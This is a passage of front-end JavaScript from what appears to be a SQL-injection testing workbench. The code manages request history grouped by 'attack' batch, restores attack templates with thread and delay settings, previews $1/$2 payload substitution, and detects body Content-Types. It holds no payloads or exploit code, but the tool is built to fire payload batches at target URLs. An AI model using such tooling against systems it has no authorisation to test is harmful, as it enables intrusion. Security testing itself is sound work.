          el.classList.remove('dragging');
          state.dragId = null;
          $$('.history-item').forEach(i => i.classList.remove('drag-over'));
        });
        el.addEventListener('dragover', (e) => {
          e.preventDefault();
          e.dataTransfer.dropEffect = 'move';
          $$('.history-item').forEach(i => i.classList.remove('drag-over'));
          el.classList.add('drag-over');
        });
        el.addEventListener('dragleave', () => el.classList.remove('drag-over'));
        el.addEventListener('drop', (e) => {
          e.preventDefault();
          el.classList.remove('drag-over');
          if (state.dragId == null || state.dragId === item.id) return;
          reorderHistory(state.dragId, item.id);
        });

        return el;
      };

      // Group by attack when viewing Attacks filter
      const useBatchGroups = (state.hfActive === 'batch' || (state.selectedBatchIds || []).length > 0)
        && sorted.some(it => it.batchId);

      if (useBatchGroups) {
        const groups = {};
        const noBatch = [];
        sorted.forEach(it => {
          if (it.batchId) {
            if (!groups[it.batchId]) groups[it.batchId] = [];
            groups[it.batchId].push(it);
          } else {
            noBatch.push(it);
          }
        });
        Object.entries(groups).forEach(([bid, items]) => {
          const name = items[0].batchName
            || state.attackSources[bid]?.name
            || bid;
          const collapsed = !!(state.collapsedBatches && state.collapsedBatches[bid]);
          const group = document.createElement('div');
          group.className = 'hist-batch-group' + (collapsed ? ' collapsed' : '');
          group.dataset.batchId = bid;
          group.innerHTML = `
            <div class="hist-batch-group-header" data-batch-toggle="${escapeHtml(bid)}">
              <span class="g-chevron">▼</span>
              <span>⚡ ${escapeHtml(name)}</span>
              <span class="g-count">${items.length} req</span>
            </div>
            <div class="hist-batch-group-body"></div>
          `;
          const body = group.querySelector('.hist-batch-group-body');
          items.forEach(it => body.appendChild(buildHistoryItemEl(it)));
          historyList.appendChild(group);
        });
        noBatch.forEach(it => historyList.appendChild(buildHistoryItemEl(it)));
        historyList.querySelectorAll('[data-batch-toggle]').forEach(hdr => {
          hdr.addEventListener('click', () => {
            const bid = hdr.dataset.batchToggle;
            if (!state.collapsedBatches) state.collapsedBatches = {};
            state.collapsedBatches[bid] = !state.collapsedBatches[bid];
            renderHistory();
          });
        });
      } else {
        sorted.forEach((item) => historyList.appendChild(buildHistoryItemEl(item)));
      }

      // Pin buttons
      historyList.querySelectorAll('.pin-btn').forEach((btn) => {
        btn.addEventListener('click', (e) => {
          e.stopPropagation();
          const id = +btn.dataset.id;
          const item = state.history.find(h => h.id === id);
          if (item) {
            item.pinned = !item.pinned;
            renderHistory();
            if (typeof scheduleHistorySave === 'function') scheduleHistorySave();
            showToast(item.pinned ? 'Pinned' : 'Unpinned');
          }
        });
      });

      // Redirect badge → load Final URL
      historyList.querySelectorAll('.redirect-badge').forEach((badge) => {
        badge.addEventListener('click', (e) => {
          e.stopPropagation();
          const finalUrl = badge.dataset.finalUrl;
          if (!finalUrl) return;
          urlInput.value = finalUrl;
          methodSelect.value = 'GET';
          showToast('Loading Final URL…');
          sendRequest();
        });
      });

      // Cookie badge → import Set-Cookie into request headers (works in main + solo History tab)
      historyList.querySelectorAll('.cookie-badge').forEach((badge) => {
        badge.addEventListener('click', (e) => {
          e.stopPropagation();
          const itemEl = badge.closest('.history-item');
          const id = itemEl ? +itemEl.dataset.id : null;
          const item = id != null ? state.history.find((h) => h.id === id) : null;
          if (!item) return;
          // Select row + show response without touching workbench
          if (typeof loadHistoryItem === 'function') loadHistoryItem(id);
          openHistoryCookieImport(item);
        });
      });

      // Explicit "Load into editor" — only path that overwrites URL/Body
      historyList.querySelectorAll('.hist-apply-wb').forEach((btn) => {
        btn.addEventListener('click', (e) => {
          e.stopPropagation();
          const id = +btn.dataset.id;
          if (typeof loadHistoryItem === 'function') loadHistoryItem(id, { applyWorkbench: true });
        });
      });


      // Note toggle — opens detail + note in one click (no need to expand row first)
      historyList.querySelectorAll('.hist-note-btn').forEach((btn) => {
        btn.addEventListener('click', (e) => {
          e.stopPropagation();
          const id = +btn.dataset.id;
          if (state.openNoteId === id) {
            state.openNoteId = null;
          } else {
            state.openNoteId = id;
            state.openDetailId = id;
            state.activeHistoryId = id;
            if (typeof loadHistoryItem === 'function') loadHistoryItem(id);
          }
          renderHistory();
          if (state.openNoteId === id) {
            requestAnimationFrame(() => {
              const ta = historyList.querySelector('.hist-note[data-id="' + id + '"]');
              if (ta) {
                ta.hidden = false;
                ta.classList.add('is-open');
                try { ta.focus(); } catch (err) {}
              }
            });
          }
        });
      });

      // Copy as cURL
      historyList.querySelectorAll('.hist-curl-btn').forEach((btn) => {
        btn.addEventListener('click', (e) => {
          e.stopPropagation();
          const id = +btn.dataset.id;
          const item = state.history.find((h) => h.id === id);
          if (!item) return;
          const curl = buildCurlCommand(item);
          if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(curl).then(() => showToast('cURL copied', 'success'))
              .catch(() => showToast('Copy failed'));
          } else {
            showToast('Clipboard unavailable');
          }
        });
      });

      // Delete buttons
      historyList.querySelectorAll('.del-btn').forEach((btn) => {
        btn.addEventListener('click', (e) => {
          e.stopPropagation();
          const id = +btn.dataset.id;
          deleteHistoryItem(id);
        });
      });

      // Rename (double-click)
      historyList.querySelectorAll('.history-name').forEach((nameEl) => {
        nameEl.addEventListener('dblclick', (e) => {
          e.stopPropagation();
          nameEl.contentEditable = 'true';
          nameEl.focus();
          const range = document.createRange();
          range.selectNodeContents(nameEl);
          const sel = window.getSelection();
          sel.removeAllRanges();
          sel.addRange(range);
        });
        nameEl.addEventListener('blur', () => {
          nameEl.contentEditable = 'false';
          const id = +nameEl.dataset.id;
          const item = state.history.find(h => h.id === id);
          if (item) {
            const newName = nameEl.textContent.trim();
            item.name = newName || null;
            renderHistory();
          }
        });
        nameEl.addEventListener('keydown', (e) => {
          if (e.key === 'Enter') {
            e.preventDefault();
            nameEl.blur();
          }
          if (e.key === 'Escape') {
            nameEl.contentEditable = 'false';
            renderHistory();
          }
        });
      });

      // Notes — auto-save on input
      historyList.querySelectorAll('.hist-note').forEach((ta) => {
        ta.addEventListener('click', (e) => e.stopPropagation());
        ta.addEventListener('input', () => {
          const id = +ta.dataset.id;
          const item = state.history.find(h => h.id === id);
          if (item) item.note = ta.value;
        });
      });

      // Copy URL
      historyList.querySelectorAll('.hist-dl-url').forEach((btn) => {
        btn.addEventListener('click', (e) => {
          e.stopPropagation();
          const id = +btn.dataset.id;
          const item = state.history.find(h => h.id === id);
          if (!item) return;
          navigator.clipboard.writeText(item.url).then(() => showToast('URL copied', 'success'))
            .catch(() => showToast('Copy failed'));
        });
      });

      // Download request as .txt
      historyList.querySelectorAll('.hist-dl-file').forEach((btn) => {
        btn.addEventListener('click', (e) => {
          e.stopPropagation();
          const id = +btn.dataset.id;
          const item = state.history.find(h => h.id === id);
          if (!item) return;
          const text = [
            `ID: ${item.id}`,
            `Method: ${item.method}`,
            `URL: ${item.url}`,
            `Status: ${item.response.status} ${item.response.statusText || ''}`,
            `Time: ${item.response.timeMs} ms`,
            `Payload: ${item.payload || ''}`,
            `Batch: ${item.batchName || item.batchId || '-'}`,
            `Note: ${item.note || ''}`,
            `--- Response body ---`,
            item.response.body || '',
          ].join('\n');
          const blob = new Blob([text], { type: 'text/plain' });
          const a = document.createElement('a');
          a.href = URL.createObjectURL(blob);
          a.download = `request-${item.id}.txt`;
          a.click();
          URL.revokeObjectURL(a.href);
          showToast('Downloaded', 'success');
        });
      });

      // Solo History only — open response viewer for this record
      historyList.querySelectorAll('.hist-view-response').forEach((btn) => {
        btn.addEventListener('click', (e) => {
          e.stopPropagation();
          const id = +btn.dataset.id;
          if (typeof openHistResponseForItem === 'function') openHistResponseForItem(id);
        });
      });
    }

    function reorderHistory(fromId, toId) {
      const fromIdx = state.history.findIndex(h => h.id === fromId);
      const toIdx = state.history.findIndex(h => h.id === toId);
      if (fromIdx < 0 || toIdx < 0) return;
      const [moved] = state.history.splice(fromIdx, 1);
      state.history.splice(toIdx, 0, moved);
      renderHistory();
      if (typeof scheduleHistorySave === 'function') scheduleHistorySave();
    }

    function deleteHistoryItem(id) {
      const doomed = state.history.find((h) => h.id === id);
      const batchId = doomed && doomed.batchId;
      state.history = state.history.filter((h) => h.id !== id);
      if (state.activeHistoryId === id) {
        state.activeHistoryId = null;
        if (typeof clearResponseView === 'function') clearResponseView();
      }
      if (batchId && !state.history.some((h) => h.batchId === batchId)) {
        if (state.attackSources) delete state.attackSources[batchId];
        if (state.collapsedBatches) delete state.collapsedBatches[batchId];
        state.selectedBatchIds = (state.selectedBatchIds || []).filter((x) => x !== batchId);
        const optVal = 'batch:' + batchId;
        if (typeof historyStatusFilter !== 'undefined' && historyStatusFilter) {
          const opt = [...historyStatusFilter.options].find((o) => o.value === optVal);
          if (opt) opt.remove();
        }
        if (state.hfActive === optVal || state.historyStatusFilter === optVal) {
          state.hfActive = 'all';
          state.historyStatusFilter = 'all';
          if (historyStatusFilter) historyStatusFilter.value = 'all';
        }
        if (typeof renderHfChips === 'function') renderHfChips();
        showToast('Attack cleared (0 requests)');
      } else {
        showToast('Deleted');
      }
      renderHistory();
      if (typeof scheduleHistorySave === 'function') scheduleHistorySave();
    }

    /**
     * Select a history row and show its response.
     * Default: does NOT overwrite Payload / URL / Body workbench (attack templates stay).
     * Pass { applyWorkbench: true } to intentionally load that request into the editors.
     */
    function loadHistoryItem(id, opts) {
      opts = opts || {};
      const item = state.history.find(h => h.id === id);
      if (!item) return;
      state.activeHistoryId = id;
      state.openDetailId = id;

      if (opts.applyWorkbench) {
        methodSelect.value = item.method;
        urlInput.value = item.url;
        if (postBodyInput) postBodyInput.value = item.postBody || '';
        // Only fill payload lines for non-batch shots — never replace {1..N} / $1 template
        if (payloadInput && !item.batchId && item.payload != null && item.payload !== '') {
          payloadInput.value = item.payload;
          if (typeof refreshAttackPanel === 'function') refreshAttackPanel();
        }
        if (typeof updateBodyVisibility === 'function') updateBodyVisibility();
        showToast('Loaded into editor', 'success');
      }

      if (typeof setResponseCollapsed === 'function') setResponseCollapsed(false);
      // Main tab: use full response inspector. Solo History: only update if viewer already open.
      if (!document.body.classList.contains('solo-history')) {
        if (typeof displayResponse === 'function') displayResponse(item.response, item.url);
      } else if ($('#histResponsePanel')?.classList.contains('open') && typeof displayHistResponse === 'function') {
        displayHistResponse(item);
      }
      renderHistory();
    }

    /**
     * Solo-History response viewer — mirrors main displayResponse (highlight, headers legend, rendered pipeline).
     */
    function displayHistResponse(item) {
      if (!item || !item.response) return;
      const resp = item.response;
      const targetUrl = item.url || '';
      const bodyLen = (resp.body || '').length;
      const ct = (resp.headers && (resp.headers['Content-Type'] || resp.headers['content-type'])) || '';

      const sbStatus = $('#histSbStatus');
      if (sbStatus) {
        sbStatus.textContent = `${resp.status} ${resp.statusText || ''}`;
        sbStatus.className = resp.status >= 500 ? 'status-err'
          : resp.status >= 400 ? 'status-warn'
          : resp.status > 0 ? 'status-ok' : 'status-err';
      }
      if ($('#histSbTime')) $('#histSbTime').textContent = `${resp.timeMs || 0} ms`;
      if ($('#histSbSize')) $('#histSbSize').textContent = `${bodyLen} B`;
      if ($('#histSbType')) $('#histSbType').textContent = ct || '—';

      const title = $('#histResponseTitle');
      if (title) {
        const short = (item.name || getUrlPath(item.url) || 'Response').slice(0, 48);
        title.textContent = short;
      }

      // Raw — same highlighter as main inspector
      const raw = $('#histRawResponse');
      if (raw) {
        raw.innerHTML = typeof highlightCode === 'function'
          ? highlightCode(resp.body || '', ct)
          : escapeHtml(resp.body || 'No response data.');
      }

      // Headers — same legend + categorized table as main
      const metaWrap = $('#histMetaTableWrap') || $('#histMetaTable');
      if (metaWrap) {
        const legend = `<div class="meta-legend">
          <span><i style="background:#ff6b6b"></i> Security</span>
          <span><i style="background:#ffd93d"></i> Auth / Cookie</span>
          <span><i style="background:#6bcB77"></i> Cache</span>
          <span><i style="background:#4dabf7"></i> Content</span>
          <span><i style="background:#b197fc"></i> Server</span>
          <span><i style="background:#ff922b"></i> CORS</span>
        </div>`;
        let tableHtml = legend + `<table class="meta-table">
          <tr><th>Status Code</th><td><span class="meta-val-num">${resp.status}</span> ${escapeHtml(resp.statusText || '')}</td></tr>
          <tr><th>Response Time</th><td><span class="meta-val-num">${resp.timeMs || 0}</span> ms</td></tr>
          <tr><th>Body Size</th><td><span class="meta-val-num">${bodyLen}</span> bytes</td></tr>
          <tr><th>URL</th><td><span class="meta-val-url">${escapeHtml(targetUrl)}</span></td></tr>`;
        if (resp.finalUrl && resp.finalUrl !== targetUrl) {
          tableHtml += `<tr class="meta-cat-content"><th><span class="meta-key">Final URL</span><span class="meta-badge content">Redirect</span></th><td><span class="meta-val-url">${escapeHtml(resp.finalUrl)}</span></td></tr>`;
        }
        if (resp.headers && typeof highlightHeadersTable === 'function') {
          tableHtml += highlightHeadersTable(resp.headers);
        }
        tableHtml += '</table>';
        metaWrap.innerHTML = tableHtml;
      }

      // Rendered — same pipeline as main (base href, night protect, interaction bridge)
      let htmlToRender = resp.fixedHtml || resp.body || '';
      if (!resp.fixedHtml && htmlToRender) {
        let baseHref = targetUrl || 'https://example.com/';
        try {
          const u = new URL(targetUrl);
          baseHref = u.origin + u.pathname.replace(/\/[^/]*$/, '/');
        } catch { /* ignore */ }
        htmlToRender = /<head[^>]*>/i.test(htmlToRender)
          ? htmlToRender.replace(/<head[^>]*>/i, (m) => `${m}\n<base href="${baseHref}">`)
          : `<base href="${baseHref}">\n${htmlToRender}`;
      }
      if (typeof prepareHtmlForRender === 'function') {
        htmlToRender = prepareHtmlForRender(htmlToRender);
      }
      if (state.nightProtectMode > 0 && typeof applyNightProtect === 'function') {
        htmlToRender = applyNightProtect(htmlToRender, state.nightProtectMode);
      }
      if (typeof injectInteractionBridge === 'function') {
        htmlToRender = injectInteractionBridge(htmlToRender, targetUrl);
      }

      const frame = $('#histRenderedFrame');
      const empty = $('#histRenderedEmpty');
      if (frame) {
        const hasBody = !!(resp.body || resp.fixedHtml);
        if (empty) empty.style.display = hasBody ? 'none' : '';
        frame.style.display = hasBody ? 'block' : 'none';
        frame.removeAttribute('srcdoc');
        requestAnimationFrame(() => {
          frame.srcdoc = htmlToRender || '<pre style="color:#ccc;padding:16px;font:12px monospace;">Empty response body</pre>';
        });
      }
    }

    function openHistResponseForItem(id) {
      const item = state.history.find((h) => h.id === id);
      if (!item) {
        showToast('Item not found');
        return;
      }
      state.activeHistoryId = id;
      state.openDetailId = id;
      if (typeof displayHistResponse === 'function') displayHistResponse(item);
      if (typeof openVPanel === 'function') openVPanel('hist-response');
      renderHistory();
    }

    function bindHistResponseUI() {
      const panel = $('#histResponsePanel');
      if (!panel) return;
      panel.querySelectorAll('[data-hist-tab]').forEach((btn) => {
        btn.addEventListener('click', () => {
          const tab = btn.dataset.histTab;
          panel.querySelectorAll('[data-hist-tab]').forEach((b) => b.classList.toggle('active', b === btn));
          panel.querySelectorAll('[data-hist-pane]').forEach((pane) => {
            const on = pane.dataset.histPane === tab;
            pane.hidden = !on;
            pane.classList.toggle('active', on);
            pane.style.display = on ? 'flex' : 'none';
          });
        });
      });
    }

    clearHistoryBtn.addEventListener('click', () => {
      if (state.history.length === 0) return;
      const before = state.history.length;
      state.history = state.history.filter(h => h.pinned);
      const removed = before - state.history.length;
      if (state.activeHistoryId && !state.history.find(h => h.id === state.activeHistoryId)) {
        state.activeHistoryId = null;
        clearResponseView();
      }
      renderHistory();
      if (typeof scheduleHistorySave === 'function') scheduleHistorySave();
      showToast(removed ? `Cleared ${removed} unpinned item(s)` : 'Nothing to clear (all pinned)');
    });

    // History search + status filter
    const historySearchInput = $('#historySearch');
    const historyStatusFilter = $('#historyStatusFilter');
    if (historySearchInput) {
      historySearchInput.addEventListener('input', () => {
        state.historySearch = historySearchInput.value;
        renderHistory();
      });
    }
    if (historyStatusFilter) {
      historyStatusFilter.addEventListener('change', () => {
        state.historyStatusFilter = historyStatusFilter.value;
        renderHistory();
      });
    }

    // Sort buttons — click same key toggles direction
    const SORT_LABELS = {
      time: 'Time', order: 'Order', status: 'Status',
      size: 'Size', rtt: 'RTT', redir: 'Redirect',
    };
    $$('.sort-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        const key = btn.dataset.key;
        const cur = state.historySort || { key: 'time', dir: 'desc' };
        let dir = btn.dataset.dir || 'desc';
        if (cur.key === key) {
          dir = cur.dir === 'asc' ? 'desc' : 'asc';
        }
        state.historySort = { key, dir };
        $$('.sort-btn').forEach(b => {
          b.classList.remove('active');
          const k = b.dataset.key;
          const arrow = (state.historySort.key === k)
            ? (state.historySort.dir === 'asc' ? ' ↑' : ' ↓')
            : (b.dataset.dir === 'asc' ? ' ↑' : ' ↓');
          if (k === 'redir') {
            b.textContent = 'Redirect';
          } else {
            b.textContent = (SORT_LABELS[k] || k) + (state.historySort.key === k ? arrow : '');
          }
          b.dataset.dir = (state.historySort.key === k) ? state.historySort.dir : (b.dataset.dir || 'desc');
        });
        btn.classList.add('active');
        renderHistory();
      });
    });

    // Restore attack source settings
    const restoreAttackBtn = $('#restoreAttackBtn');
    if (restoreAttackBtn) {
      restoreAttackBtn.addEventListener('click', () => {
        const bar = $('#attackSourceBar');
        const bid = bar && bar.dataset.batchId;
        const src = bid && state.attackSources[bid];
        if (!src) {
          showToast('No source saved for this attack');
          return;
        }
        urlInput.value = src.urlTemplate || '';
        payloadInput.value = src.payloadText || '';
        methodSelect.value = src.method || 'GET';
        if (postBodyInput) postBodyInput.value = src.postBody || '';
        if (src.headers) {
          state.headers = src.headers.map(h => ({ ...h }));
          renderHeaders();
        }
        if (src.atkConfig) {
          if ($('#atkThreads')) $('#atkThreads').value = src.atkConfig.threads;
          if ($('#atkDelay')) $('#atkDelay').value = src.atkConfig.delay;
          if ($('#atkTimeout')) $('#atkTimeout').value = src.atkConfig.timeout;
          // legacy stopOn ignored — advanced panel used instead
        }
        if (typeof updateBodyVisibility === 'function') updateBodyVisibility();
        if (typeof refreshAttackPanel === 'function') refreshAttackPanel();
        showToast('Attack source restored: ' + (src.name || ''), 'success');
      });
    }

    // URL hover preview — show resolved URL after $1/$2 substitution
    const urlPreviewTip = $('#urlPreviewTip');
    const urlPreviewText = $('#urlPreviewText');
    function updateUrlPreview() {
      if (!urlPreviewText) return;
      const raw = urlInput.value.trim();
      let resolved = raw;
      try {
        if (typeof detectAttackMode === 'function' && typeof applySinglePayload === 'function') {
          const { payloads } = detectAttackMode();
          if (payloads.length > 0 && raw.includes('$')) {
            resolved = applySinglePayload(raw, payloads[0].text);
            if (payloads.length > 1) {
              resolved += `   (+${payloads.length - 1} more in batch)`;
            }
          } else if (typeof applyPayloadPlaceholders === 'function') {
            resolved = applyPayloadPlaceholders(raw);
          }
        } else if (typeof applyPayloadPlaceholders === 'function') {
          resolved = applyPayloadPlaceholders(raw);
        }
      } catch (_) { resolved = raw; }
      urlPreviewText.textContent = resolved || '(empty)';
      if (resolved !== raw && raw.includes('$')) {
        urlPreviewTip.style.borderColor = 'var(--success)';
        urlPreviewText.style.color = 'var(--success)';
      } else {
        urlPreviewTip.style.borderColor = 'var(--accent-cyan)';
        urlPreviewText.style.color = 'var(--accent-cyan)';
      }
    }
    if (urlInput && urlPreviewTip) {
      // Only when mouse is directly over the URL input (not the wrapper/card)
      urlInput.addEventListener('mouseenter', () => {
        updateUrlPreview();
        urlPreviewTip.classList.add('show');
      });
      urlInput.addEventListener('mouseleave', () => {
        urlPreviewTip.classList.remove('show');
      });
      urlInput.addEventListener('input', () => {
        if (urlPreviewTip.classList.contains('show')) updateUrlPreview();
        if (typeof updateUrlSuggest === 'function') updateUrlSuggest();
      });
      if (payloadInput) {
        payloadInput.addEventListener('input', () => {
          if (urlPreviewTip.classList.contains('show')) updateUrlPreview();
          if (bodyPreviewTip && bodyPreviewTip.classList.contains('show')) updateBodyPreview();
        });
      }
    }

    // ===== URL History (browser-like autocomplete) =====
    const URL_HIST_KEY = 'sqli-workbench-url-history-v1';
    const URL_HIST_MAX = 80;
    let urlSuggestIndex = -1;

    function loadUrlHistory() {
      try {
        const raw = localStorage.getItem(URL_HIST_KEY);
        const arr = raw ? JSON.parse(raw) : [];
        return Array.isArray(arr) ? arr.filter((u) => typeof u === 'string' && u.trim()) : [];
      } catch { return []; }
    }
    function saveUrlHistory(list) {
      try { localStorage.setItem(URL_HIST_KEY, JSON.stringify(list || [])); } catch {}
    }
    /** Remember a URL after Send (survives refresh) */
    function rememberUrl(url) {
      url = String(url || '').trim();
      if (!url) return;
      let list = loadUrlHistory().filter((u) => u !== url);
      list.unshift(url);
      if (list.length > URL_HIST_MAX) list = list.slice(0, URL_HIST_MAX);
      saveUrlHistory(list);
    }
    function removeUrlHistoryEntry(url) {
      saveUrlHistory(loadUrlHistory().filter((u) => u !== url));
    }
    function hideUrlSuggest() {
      const box = $('#urlSuggest');
      if (box) box.classList.add('hidden');
      urlSuggestIndex = -1;
    }
    function updateUrlSuggest() {
      const box = $('#urlSuggest');
      if (!box || !urlInput) return;
      // Don't fight the $1 preview tooltip
      if (urlPreviewTip && urlPreviewTip.classList.contains('show')) {
        box.classList.add('hidden');
        return;
      }
      const q = (urlInput.value || '').trim().toLowerCase();
      let list = loadUrlHistory();
      if (q) list = list.filter((u) => u.toLowerCase().includes(q));
      list = list.slice(0, 12);
      if (!list.length) {
        box.classList.add('hidden');
        box.innerHTML = '';
        return;
      }
      urlSuggestIndex = -1;
      box.innerHTML = list.map((u, i) => `
        <div class="url-suggest-item" data-url="${escapeHtml(u)}" data-idx="${i}" role="option">
          <span class="url-suggest-text" title="${escapeHtml(u)}">${escapeHtml(u)}</span>
          <button type="button" class="url-suggest-del" data-del="${escapeHtml(u)}" title="Remove from history">×</button>
        </div>
      `).join('');
      box.classList.remove('hidden');
      box.querySelectorAll('.url-suggest-item').forEach((el) => {
        el.addEventListener('mousedown', (e) => {
          if (e.target.closest('.url-suggest-del')) return;
          e.preventDefault();
          urlInput.value = el.dataset.url || '';
          hideUrlSuggest();
          urlInput.focus();
          if (typeof updateUrlPreview === 'function') updateUrlPreview();
        });
      });
      box.querySelectorAll('.url-suggest-del').forEach((btn) => {
        btn.addEventListener('mousedown', (e) => {
          e.preventDefault();
          e.stopPropagation();
          removeUrlHistoryEntry(btn.dataset.del);
          updateUrlSuggest();
        });
      });
    }
    function moveUrlSuggest(delta) {
      const box = $('#urlSuggest');
      if (!box || box.classList.contains('hidden')) return;
      const items = [...box.querySelectorAll('.url-suggest-item')];
      if (!items.length) return;
      urlSuggestIndex = Math.max(-1, Math.min(items.length - 1, urlSuggestIndex + delta));
      items.forEach((el, i) => el.classList.toggle('active', i === urlSuggestIndex));
      if (urlSuggestIndex >= 0) items[urlSuggestIndex].scrollIntoView({ block: 'nearest' });
    }
    if (urlInput) {
      urlInput.addEventListener('focus', () => updateUrlSuggest());
      urlInput.addEventListener('keydown', (e) => {
        const box = $('#urlSuggest');
        const open = box && !box.classList.contains('hidden');
        if (e.key === 'ArrowDown' && open) {
          e.preventDefault();
          moveUrlSuggest(1);
        } else if (e.key === 'ArrowUp' && open) {
          e.preventDefault();
          moveUrlSuggest(-1);
        } else if (e.key === 'Enter' && open && urlSuggestIndex >= 0) {
          const item = box.querySelector(`.url-suggest-item[data-idx="${urlSuggestIndex}"]`);
          if (item) {
            e.preventDefault();
            urlInput.value = item.dataset.url || '';
            hideUrlSuggest();
          }
        } else if (e.key === 'Escape' && open) {
          hideUrlSuggest();
        }
      });
      document.addEventListener('click', (e) => {
        if (!e.target.closest('.url-input-wrap')) hideUrlSuggest();
      });
    }

    // ===== Body Content-Type detection =====
    function detectBodyContentType(body) {
      const s = String(body || '').trim();
      if (!s) return { mime: '', label: 'empty', kind: 'empty' };
      // JSON
      if ((s.startsWith('{') && s.endsWith('}')) || (s.startsWith('[') && s.endsWith(']'))) {
        try {
          JSON.parse(s);
          return { mime: 'application/json', label: 'JSON', kind: 'json' };
        } catch { /* fallthrough */ }
      }
      // XML
      if (s.startsWith('<?xml') || /^<[a-zA-Z_][\w:.-]*[\s>]/.test(s)) {
        return { mime: 'application/xml', label: 'XML', kind: 'xml' };
      }
      // multipart
      if (/^------WebKitFormBoundary|^--[A-Za-z0-9_-]+/m.test(s) && /Content-Disposition:/i.test(s)) {
        return { mime: 'multipart/form-data', label: 'multipart', kind: 'multipart' };
      }
      // form urlencoded: key=value pairs joined by &
      if (/^[^=&\s]+=/.test(s) && s.includes('=') && !s.includes('{') && !s.includes('<')) {
        const pairs = s.split('&').filter(Boolean);
        if (pairs.length >= 1 && pairs.every((p) => /^[^=]+=/.test(p) || p.includes('='))) {
          return { mime: 'application/x-www-form-urlencoded', label: 'form', kind: 'form' };
        }
      }
      return { mime: 'text/plain', label: 'text', kind: 'text' };
    }

    function getConfiguredContentType() {
      const h = state.headers.find((x) => (x.key || '').toLowerCase() === 'content-type');
      return h && h.value.trim() ? h.value.trim() : '';
    }

    // Body CT mode: 'auto' | mime string | 'custom'
    let bodyCtMode = 'auto';

    function updateBodyCtUI() {
      const wrap = $('#bodyCtWrap');
      const badge = $('#bodyCtBadge');
      const menu = $('#bodyCtMenu');
      const custom = $('#bodyCtCustom');
      if (!badge || !wrap) return;
      const body = postBodyInput ? postBodyInput.value : '';
      const det = detectBodyContentType(body);
      const configured = getConfiguredContentType();

      // Hide entire CT UI when body is empty
      if (!det.mime) {
        wrap.classList.add('hidden');
        if (menu) menu.classList.add('hidden');
        return;
      }
      wrap.classList.remove('hidden');
      if (custom) custom.classList.toggle('hidden', bodyCtMode !== 'custom');

      badge.className = 'body-ct-badge';
      let cls = 'ct-' + det.kind;
      let text = det.label;
      if (bodyCtMode === 'auto' && configured && configured.toLowerCase() !== det.mime.toLowerCase()) {
        cls = 'ct-conflict';
        text = det.label + ' ≠ hdr';
        badge.title = `Detected: ${det.mime}\nSettings Content-Type: ${configured}\nClick to override type`;
      } else if (bodyCtMode !== 'auto') {
        const chosen = bodyCtMode === 'custom' ? (custom?.value || 'custom') : bodyCtMode;
        text = String(chosen).split('/').pop() || chosen;
        badge.title = `Will send: ${chosen}\nDetected: ${det.mime}\nClick to change`;
        if (String(chosen).toLowerCase().includes('json')) cls = 'ct-json';
        else if (String(chosen).includes('form')) cls = 'ct-form';
        else if (String(chosen).includes('xml')) cls = 'ct-xml';
      } else {
        badge.title = `Detected: ${det.mime}` + (configured ? `\nSettings: ${configured}` : '\nWill auto-set Content-Type') + '\nClick to change';
      }
      badge.classList.add(cls);
      badge.textContent = text;

      if (menu) {
        menu.querySelectorAll('button[data-ct]').forEach((b) => {
          b.classList.toggle('active', b.dataset.ct === bodyCtMode);
        });
      }
    }

    /**
     * Build final headers for a request with body Content-Type rules:
     * - Auto + no Settings CT → set detected
     * - Auto + Settings CT → keep Settings (no override)
     * - Manual body CT → override / set Content-Type for this request
     */
    function buildRequestHeaders(postBody) {
      const headers = {};
      state.headers.forEach((h) => {
        if (h.key.trim()) headers[h.key.trim()] = h.value;
      });
      const hasBody = String(postBody || '').length > 0;
      if (!hasBody) return headers;

      const mode = bodyCtMode || 'auto';
      const ctKey = Object.keys(headers).find((k) => k.toLowerCase() === 'content-type');
      const configured = ctKey ? headers[ctKey] : '';

      if (mode === 'auto') {
        if (!configured || !String(configured).trim()) {
          const det = detectBodyContentType(postBody);
          if (det.mime) headers[ctKey || 'Content-Type'] = det.mime;
        }
      } else {
        let chosen = mode;
        if (mode === 'custom') chosen = ($('#bodyCtCustom')?.value || '').trim() || 'text/plain';
        if (ctKey) headers[ctKey] = chosen;
        else headers['Content-Type'] = chosen;
      }
      return headers;
    }

    // Wire body CT controls (badge menu — no separate select)
    (function bindBodyCtUI() {
      const badge = $('#bodyCtBadge');
      const menu = $('#bodyCtMenu');
      const custom = $('#bodyCtCustom');
      if (badge && menu) {
        badge.addEventListener('click', (e) => {
          e.stopPropagation();
          menu.classList.toggle('hidden');
        });
        // Scroll stays inside the menu — don't scroll the whole payload panel
        menu.addEventListener('wheel', (e) => {
          e.stopPropagation();
        }, { passive: true });
        menu.querySelectorAll('button[data-ct]').forEach((btn) => {
          btn.addEventListener('click', (e) => {
            e.stopPropagation();
            bodyCtMode = btn.dataset.ct || 'auto';
            menu.classList.add('hidden');
            updateBodyCtUI();
            if (bodyCtMode === 'custom' && custom) {
              custom.classList.remove('hidden');
              custom.focus();
            }
          });
        });
        document.addEventListener('click', () => menu.classList.add('hidden'));
      }
      if (custom) custom.addEventListener('input', updateBodyCtUI);
      if (postBodyInput) postBodyInput.addEventListener('input', updateBodyCtUI);
      setTimeout(updateBodyCtUI, 0);
    })();

    // Body hover preview — show resolved body after $1/$2 substitution
    const bodyPreviewTip = $('#bodyPreviewTip');
    const bodyPreviewText = $('#bodyPreviewText');
    function updateBodyPreview() {
      if (!bodyPreviewText || !postBodyInput) return;
      const raw = postBodyInput.value;
      let resolved = raw;
      try {
        if (typeof detectAttackMode === 'function' && typeof applySinglePayload === 'function') {
          const { payloads } = detectAttackMode();
          if (payloads.length > 0 && raw.includes('$')) {
            resolved = applySinglePayload(raw, payloads[0].text);
            if (payloads.length > 1) {
              resolved += `\n\n(+${payloads.length - 1} more in batch)`;
            }
          } else if (typeof applyPayloadPlaceholders === 'function') {
            resolved = applyPayloadPlaceholders(raw);
          }
        } else if (typeof applyPayloadPlaceholders === 'function') {
          resolved = applyPayloadPlaceholders(raw);
        }
      } catch (_) { resolved = raw; }
      bodyPreviewText.textContent = resolved || '(empty body)';
      if (resolved !== raw && raw.includes('$')) {
        bodyPreviewTip.style.borderColor = 'var(--success)';
        bodyPreviewText.style.color = 'var(--success)';
      } else {
        bodyPreviewTip.style.borderColor = 'var(--accent-cyan)';
        bodyPreviewText.style.color = 'var(--accent-cyan)';
      }
    }
    if (postBodyInput && bodyPreviewTip) {
      postBodyInput.addEventListener('mouseenter', () => {
        updateBodyPreview();
        bodyPreviewTip.classList.add('show');
      });
      postBodyInput.addEventListener('mouseleave', () => {
